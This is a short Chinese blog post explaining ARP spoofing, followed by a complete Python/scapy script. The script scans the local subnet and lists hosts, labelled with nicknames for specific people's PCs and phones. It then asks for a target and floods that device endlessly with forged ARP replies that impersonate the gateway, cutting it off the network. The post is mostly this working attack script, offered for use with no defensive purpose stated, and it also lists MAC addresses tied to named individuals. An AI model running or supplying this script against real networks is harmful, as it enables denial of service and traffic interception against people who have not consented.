---
title: ARP攻击
categories: 计算机网络
tags:
  - Python
  - ARP
abbrlink: b286d8f1
date: 2020-10-05 20:35:05
---
# 原理
攻击者向局域网特定网络设备持续的发送ARP欺骗数据包，对该网络设备进行网关欺骗，使其认为网关为攻击者设备，如果攻击者不对被攻击者的网络请求进行处理的话，会造成被攻击者断网。

# 代码

inet为一个列表，存储发起ARP攻击要使用的网卡，分别存储网卡名称和网卡MAC地址，net为当前选中网卡序号。
host为一个备注字典表，键，值分别对应MAC地址和备注。
<!--more-->

```py
from scapy.all import *
import time

inet = [
    ["Intel(R) Dual Band Wireless-AC 3165", "7C:67:A2:F1:9D:2A"],
    ["802.11n USB Wireless LAN Card", "70:F1:1C:04:8A:54"]
]
host = {
    "60:14:b3:ad:85:7d": "LiuQI's PC-eth",
    "50:a0:09:d1:fb:65": "MiAi Sound Box",
    "04:4f:4c:8e:dc:b8": "LiuQi's Honor 9",
    "f4:30:b9:a6:0f:76": "Unkown",
    "54:e1:ad:7c:0b:53": "ZhiHao's PC-eth"
}
net = 0
wifi = inet[net][0]
for line in os.popen('route print'):
    s = line.strip()
    if s.startswith('0.0.0.0'):
        slist = s.split()
        ip = slist[3]
        gw = slist[2]
        break
print('GW：', gw)
print('IP：', ip)
tnet = gw + '/24'
p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=tnet)
ans, unans = srp(p, iface=wifi, timeout=5, verbose=0)
print("Total %d Host：" % len(ans))
result = []
for s, r in ans:
    result.append([r[ARP].psrc, r[ARP].hwsrc])
result.sort()
for index, (ip, mac) in enumerate(result):
    print(index + 1, ": ", ip, "\t---->\t", mac, end='')
    if not host.get(mac) == None:
        print(" ......", host[mac])
    else:
        print()
target = int(input("Target：")) - 1
target = result[target][0]
p1 = Ether(dst='ff:ff:ff:ff:ff:ff', src=inet[net][1]) / ARP(pdst=target, psrc=gw)
print("Processing......")
while True:
    sendp(p1, verbose=0)
    time.sleep(0)
```
